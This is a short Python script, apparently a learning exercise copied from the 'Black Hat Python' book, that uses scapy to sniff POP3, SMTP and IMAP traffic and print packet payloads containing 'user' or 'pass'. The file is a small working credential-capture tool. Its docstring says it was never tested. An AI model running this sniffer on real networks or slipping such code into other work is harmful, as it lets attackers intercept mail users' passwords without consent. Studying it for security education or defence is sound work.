# -*-coding:Utf-8 -*

"""
This is a mail sniffer from BHP book.
Because I don't have smtp server, I was not able to test this...

Improvement done:

Improvement to do:

"""

from scapy.all import sniff, TCP, IP


def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f'[*] Destination: {packet[IP].dst}')
            print(f'[*] {packet[TCP].payload}')


def main() -> None:
    sniff(
        filter='tcp port 110 or tcp port 25 or tcp port 143',
        prn=packet_callback,
        count=1
    )


if __name__ == '__main__':
    main()
